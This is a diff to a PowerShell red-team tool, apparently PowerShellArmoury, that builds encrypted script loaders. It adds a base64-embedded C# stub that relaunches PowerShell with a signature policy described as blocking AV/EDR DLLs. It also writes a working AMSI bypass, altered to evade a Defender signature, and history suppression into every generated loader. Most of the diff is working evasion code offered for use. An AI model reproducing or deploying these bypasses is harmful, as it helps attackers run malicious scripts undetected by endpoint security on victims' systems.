@@ -23,6 +23,10 @@ Note that you have to provide a valid github account as well as a personal acces
 
 The path to your new armoury file. The default ist ".\MyArmoury.ps1"
 
+.PARAMETER FromFile
+
+Load your Powershell scripts directly from a local folder or file and you don't have to provide a config file.
+
 .PARAMETER Config
 
 The path to your JSON-config file. Have a look at the sample that comes with this script for ideas.
@@ -47,6 +51,15 @@ This switch will remove the plaintext password from the final armoury script. Us
 
 Use this together with "-Config" to let the script validate the basic syntax of your JSON config file without executing it.
 
+.PARAMETER Use3DES
+
+Encrypts with 3DES instead of AES.
+
+.PARAMETER EnhancedArmour
+
+Instructs your armoury to require a protectecd PowerShell process. Therefore on first execution, your armoury will not load but spawn a new PowerShell that is set to run with BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON process mitigation.
+This prevents non-microsoft DLLs (e.g. AV/EDR products) to load into PowerShell.
+Shamelessly copied from the great example of @_rastamouse: https://gist.github.com/rasta-mouse/af009f49229c856dc26e3a243db185ec
 
 .EXAMPLE
 
@@ -77,12 +90,21 @@ This will read the config file from the current directory using ".\MyArmoury.jso
 
 .EXAMPLE
 
-New-PsArmoury -Config .\MyArmoury.json -ValidateOnly
+New-PsArmoury -FromFile .\myfolderfullofps1scripts\
 
 Description
 -----------
 
-This will just validate the config at ".\MyArmoury.json" without executing anything.
+Loads all ps1 files from the given folder into your armoury without requiring a config file.
+
+.EXAMPLE
+
+New-PsArmoury -Config .\MyArmoury.json -Path C:\temp\MyFancyArmoury.ps1 -EnhancedArmour
+
+Description
+-----------
+
+Creates armoury based on MyArmoury.json as previous examples but will use BlockDLL process mitigiation. (see parameter description)
 
 .LINK
 
@@ -126,7 +148,11 @@ https://github.com/cfalta/PowerShellArmoury
 
         [Parameter(Mandatory = $False)]
         [Switch]
-        $Use3DES
+        $Use3DES,
+
+        [Parameter(Mandatory = $False)]
+        [Switch]
+        $EnhancedArmour
     )
 
 function Test-PSAConfig
@@ -182,6 +208,195 @@ function Get-Password([int]$Length)
 function Write-LoaderFile($EncryptedScriptFileObjects)
 {
 
+$DLLMitigationPolicy=@"
+    using System;
+    using System.Diagnostics;
+    using System.Runtime.InteropServices;
+    
+    namespace PSSecure
+    {
+        public class Program
+        {
+            public static void Main(string[] args)
+            {
+                var startInfoEx = new Win32.STARTUPINFOEX();
+                var processInfo = new Win32.PROCESS_INFORMATION();
+                
+                startInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startInfoEx);
+    
+                var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
+    
+                try
+                {
+                    var processSecurity = new Win32.SECURITY_ATTRIBUTES();
+                    var threadSecurity = new Win32.SECURITY_ATTRIBUTES();
+                    processSecurity.nLength = Marshal.SizeOf(processSecurity);
+                    threadSecurity.nLength = Marshal.SizeOf(threadSecurity);
+    
+                    var lpSize = IntPtr.Zero;
+                    Win32.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
+                    startInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+                    Win32.InitializeProcThreadAttributeList(startInfoEx.lpAttributeList, 2, 0, ref lpSize);
+    
+                    Marshal.WriteIntPtr(lpValue, new IntPtr((long)Win32.BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
+    
+                    Win32.UpdateProcThreadAttribute(
+                        startInfoEx.lpAttributeList,
+                        0,
+                        (IntPtr)Win32.ProcThreadAttribute.MITIGATION_POLICY,
+                        lpValue,
+                        (IntPtr)IntPtr.Size,
+                        IntPtr.Zero,
+                        IntPtr.Zero
+                        );
+    
+                    Win32.CreateProcess(
+                        args[0],
+                        null,
+                        ref processSecurity,
+                        ref threadSecurity,
+                        false,
+                        Win32.CreationFlags.ExtendedStartupInfoPresent | Win32.CreationFlags.CreateNewConsole,
+                        IntPtr.Zero,
+                        null,
+                        ref startInfoEx,
+                        out processInfo
+                        );
+                }
+                catch (Exception e)
+                {
+                    Console.Error.WriteLine(e.StackTrace);
+                }
+                finally
+                {
+                    Win32.DeleteProcThreadAttributeList(startInfoEx.lpAttributeList);
+                    Marshal.FreeHGlobal(startInfoEx.lpAttributeList);
+                    Marshal.FreeHGlobal(lpValue);
+    
+                    Console.WriteLine("New PowerShell with PID {0} started.", processInfo.dwProcessId);
+                }
+            }
+        }
+    
+        class Win32
+        {
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+    
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+    
+            [DllImport("kernel32.dll")]
+            public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+    
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);
+    
+            [StructLayout(LayoutKind.Sequential)]
+            public struct PROCESS_INFORMATION
+            {
+                public IntPtr hProcess;
+                public IntPtr hThread;
+                public int dwProcessId;
+                public int dwThreadId;
+            }
+    
+            [StructLayout(LayoutKind.Sequential)]
+            public struct STARTUPINFO
+            {
+                public uint cb;
+                public IntPtr lpReserved;
+                public IntPtr lpDesktop;
+                public IntPtr lpTitle;
+                public uint dwX;
+                public uint dwY;
+                public uint dwXSize;
+                public uint dwYSize;
+                public uint dwXCountChars;
+                public uint dwYCountChars;
+                public uint dwFillAttributes;
+                public uint dwFlags;
+                public ushort wShowWindow;
+                public ushort cbReserved;
+                public IntPtr lpReserved2;
+                public IntPtr hStdInput;
+                public IntPtr hStdOutput;
+                public IntPtr hStdErr;
+            }
+    
+            [StructLayout(LayoutKind.Sequential)]
+            public struct STARTUPINFOEX
+            {
+                public STARTUPINFO StartupInfo;
+                public IntPtr lpAttributeList;
+            }
+    
+            [StructLayout(LayoutKind.Sequential)]
+            public struct SECURITY_ATTRIBUTES
+            {
+                public int nLength;
+                public IntPtr lpSecurityDescriptor;
+                public int bInheritHandle;
+            }
+    
+            [Flags]
+            public enum ProcThreadAttribute : int
+            {
+                MITIGATION_POLICY = 0x20007,
+                PARENT_PROCESS = 0x00020000
+            }
+    
+            [Flags]
+            public enum BinarySignaturePolicy : ulong
+            {
+                BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000,
+                BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x300000000000
+            }
+    
+            [Flags]
+            public enum CreationFlags : uint
+            {
+                CreateSuspended = 0x00000004,
+                DetachedProcess = 0x00000008,
+                CreateNoWindow = 0x08000000,
+                ExtendedStartupInfoPresent = 0x00080000,
+                CreateNewConsole = 0x00000010
+            }
+        }
+    }
+"@
+
+$DLLMitigationPolicyEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($DLLMitigationPolicy))
+$DecisionMarker = Get-Random
+
+$BlockDLLStubPrefix = @"
+if(`$env:$DecisionMarker)
+{
+"@
+$BlockDLLStubSuffix = @"
+}
+else
+{
+Write-Output "PSArmoury: Your armoury is set to run with enhanced process mitigation policy. This will block any Non-Microsoft DLLs (e.g. AV) from running inside PowerShell."
+Write-Output "PSArmoury: We will now spawn a new, protected PowerShell process. You have to load your armoury manually in there again to continue."
+Write-Output "PSArmoury: Press any key to continue..."
+`$null = Read-Host
+`$env:$DecisionMarker = `$true
+`$TypeDefEncoded = "$DLLMitigationPolicyEncoded"
+`$TypeDef = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$TypeDefEncoded))
+Add-Type -TypeDefinition `$TypeDef
+[PSSecure.Program]::Main("C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe")
+}
+"@
+
+$BypassStub=@"
+#EDR Bypass
+Set-PSReadlineOption -HistorySaveStyle SaveNothing
+
+#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
+(([Ref].Assembly.gettypes() | where {`$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {`$_.Name -like "amsiInit*ailed"}).SetValue(`$null,`$true)
+"@
+
 if($global:3DES)
 {
 
@@ -189,12 +404,6 @@ if($global:3DES)
 $DecryptionStub=@"
 if(`$Password -and `$Salt)
 {
-#EDR Bypass
-Set-PSReadlineOption -HistorySaveStyle SaveNothing
-
-#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
-(([Ref].Assembly.gettypes() | where {`$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {`$_.Name -like "amsiInit*ailed"}).SetValue(`$null,`$true)
-
 `$Index = 0
 foreach(`$ef in `$EncryptedFunctions)
 {
@@ -237,12 +446,6 @@ else {
 $DecryptionStub=@"
 if(`$Password -and `$Salt)
 {
-#EDR Bypass
-Set-PSReadlineOption -HistorySaveStyle SaveNothing
-
-#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
-(([Ref].Assembly.gettypes() | where {`$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {`$_.Name -like "amsiInit*ailed"}).SetValue(`$null,`$true)
-
 `$Index = 0
 foreach(`$ef in `$EncryptedFunctions)
 {
@@ -318,10 +521,13 @@ try {`$Message | Invoke-Expression } catch { Write-Warning "Error loading functi
     $PasswordDefiniton = ('$Password="' + $PasswordInFile + '"')
     $SaltDefiniton = ('$Salt="' + $SaltInFile + '"')
 
-    #Write password, salt and decryption stub to the loader file
+    #Write password, salt, detection bypass and decryption stub to the loader file; Optionally add stub for blocking non MS DLLs 
     Add-Content $Path $PasswordDefiniton
     Add-Content $Path $SaltDefiniton
+    Add-Content $Path $BypassStub
+    if($EnhancedArmour){Add-Content $Path $BlockDLLStubPrefix}
     Add-Content $Path $DecryptionStub
+    if($EnhancedArmour){Add-Content $Path $BlockDLLStubSuffix}
 
 }
 
